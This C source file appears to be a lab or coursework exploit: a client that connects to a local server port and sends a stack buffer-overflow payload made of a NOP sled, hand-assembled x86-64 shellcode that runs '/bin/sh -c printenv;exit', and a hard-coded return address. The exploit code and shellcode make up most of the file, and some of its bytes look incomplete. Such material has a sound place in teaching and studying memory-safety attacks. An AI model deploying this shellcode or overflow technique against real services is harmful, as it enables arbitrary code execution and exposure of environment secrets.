#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[120]={
                                             //  bits 64
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//; two nop matching size in selfcomp.c
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
     0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    
  
                                            //   bits 64
                                             //       ; find out where we are
    0xEB, 0x62,                    		    //start:     jmp short codeEnd
    0x5E,                     				//start2:    pop rsi
                                            //            ; clear the a register
    0xB8,              					    //           mov rax,0x0
                                            //            ; restore null bytes to data
    0x88, 0x46, 0x07,                  	    //           mov [byte rsi+flagStr-exeStr-2],al
    0x88, 0x46, 0x0B,                  	    //           mov [byte rsi+cmdStr-exeStr-1],al
    0x88, 0x46, 0x19,                  	    //           mov [byte rsi+arrayAddr-exeStr-1],al
    0x48, 0x89, 0x46, 0x32,                 //           mov [byte rsi+arrayAddr-exeStr+24],rax
                                            //           
                                            //            ; restore argv
                                            //            
    0x48, 0x89, 0x76, 0x1A,                 //           mov [byte rsi + arrayAddr - exeStr],rsi
    0x48, 0x8D, 0x7E, 0x09,                 //           lea rdi,[byte rsi + flagStr - exeStr] 
    0x48, 0x89, 0x7E, 0x1E,                 //           mov [byte rsi + arrayAddr - exeStr + 4],rdi
    0x48, 0x8D, 0x7E, 0x0C,                 //           lea rdi, [byte rsi + cmdStr - exeStr]
    0x48, 0x89, 0x7E, 0x22,                 //           mov [byte rsi + arrayAddr - exeStr + 8],rdi
    
                                            //            ; execve system call
    0xB0, 0x3B,                 			//           mov al,0x3b
    0x48, 0xBF,                 		  	//           mov rdi,exeStr
        
    0x48, 0xBE,                   			//           mov rsi,arrayAddr
        
    0x48, 0x89, 0xE2,                  	    //           mov rdx,rsp
    0x48, 0xC1, 0xEA, 0x20,                 //           shr rdx,32
    0x48, 0xC1, 0xE2, 0x20,                 //           shl rdx,32
    0x48, 0x8B, 0x0C, 0x25, 
    0xC0, 0x56, 0xFB, 0xF7,        		    //           mov rcx,[0x7ffff7fb56c0]
                                                    
    0x48, 0x09, 0xCA,                   	//           or  rdx,rcx
    0x48, 0x8D, 0x3A,                   	//           lea rdi,[rdx]
    0x0F, 0x05,                    		    //           syscall
                                            //
                                            //            ; exit system call
    0x48, 0x89, 0xC7,                   	//           mov rdi,rax
    0x48, 0x31, 0xC0,                   	//           xor rax,rax
    0xB0, 0x3C,                    		    //           mov al,0x3c
    0x0F, 0x05,                    		    //           syscall
                                            //
    0xE8, 0x99, 0xFF, 0xFF, 0xFF,           //codeEnd:   call start2
                                            //            ; data
    0x2F, 0x62, 0x69, 0x6E, 0x2F, 
    0x73, 0x68, 0x58, 0x79,      			//exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                  	    //flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74, 
    0x65, 0x6E, 0x76, 0x3B,     			//cmdStr:    db "printenv;exitX"
    0x65, 0x78, 0x69, 0x74, 0x58,           //
    0xFF, 0xFF, 0xFF, 0xFF,                 //arrayAddr: dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //           dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //           dd 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF,                 //           dd 0xffffffffffffffff
                                        	//newAddr:   dd newAddr-start
     // ret addy
    0xff,0xff,0xff,0xff,0xff,0x7f,0x00,
    
    //newline and null byte
    0x0A,0x00
};

char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" // 20
    "xxxxxxxxxxxxxxxxxxxx" // 40
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, compromise);  
    fflush(outfile);
}

